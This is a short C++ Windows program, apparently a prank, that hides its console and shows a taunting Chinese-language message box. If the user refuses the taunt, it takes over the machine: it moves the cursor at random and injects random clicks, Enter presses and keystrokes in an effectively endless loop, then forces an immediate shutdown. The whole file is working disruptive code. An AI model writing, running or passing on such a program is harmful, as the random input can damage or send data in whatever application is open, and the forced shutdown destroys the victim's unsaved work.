#include<windows.h>
#include<cstdlib>
#include<ctime>
#include <climits>
int main(){
	HWND hwnd=FindWindow("ConsoleWindowClass",NULL);
	ShowOwnedPopups(hwnd,SW_HIDE);
	ShowWindow(hwnd,SW_HIDE);
	while(MessageBox(NULL,"快叫我爸爸","叫我爸爸就放过你",MB_YESNO|MB_ICONWARNING)==IDYES)MessageBox(NULL,"真乖","真乖",MB_OK|MB_ICONINFORMATION);
	MessageBox(NULL,"可恶","没大没小的!",MB_OK|MB_ICONERROR);
	srand(time(NULL));
	POINT p;
	int x=GetSystemMetrics(SM_CXSCREEN),y=GetSystemMetrics(SM_CYSCREEN);
	for(long long i=LLONG_MIN;i<=LLONG_MAX;i++){
		SetCursorPos(rand()%x,rand()%y);
		if(rand()%3){
			if(rand()%2){
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				Sleep(10);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}else{
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				Sleep(10);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
		}else if(rand()%2){
			keybd_event(VK_RETURN,0,0,0);
			Sleep(10);
			keybd_event(VK_RETURN,0,KEYEVENTF_KEYUP,0);
		}else{
			char k=rand()%96+32;
			keybd_event(k,0,0,0);
			Sleep(10);
			keybd_event(k,0,KEYEVENTF_KEYUP,0);
		}
	}
	MessageBox(NULL,"再见","再见了朋友!",MB_OK|MB_ICONINFORMATION);
	system("shutdown -f -s -t 0");
	return 0;
}
